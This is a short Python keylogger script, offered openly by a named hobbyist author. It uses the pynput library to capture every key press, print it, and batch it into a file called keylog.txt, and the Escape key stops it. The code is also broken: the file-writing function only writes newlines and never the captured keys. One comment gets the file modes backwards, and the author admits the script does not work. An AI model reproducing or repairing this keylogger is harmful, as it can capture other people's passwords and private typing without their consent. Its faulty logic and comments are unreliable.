import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} key pressed on keyboard".format(key))

    if count >= 4:
        # This numerical value can be changed, however many keys are pressed, the log file will update
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
# This adds to a nice, clean log file for keylogging. If needed, change "w" to "a" (for creating a new file)


def on_release(key):
    if key == Key.esc:
        return False
# Key that will end the script, default is set to Escape (esc)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


# Made by Damien/GunFighterMan101
# I really tried with this one don't heckle me because it's broken. Fix it if you are so upset. Thanks for understanding, 73.
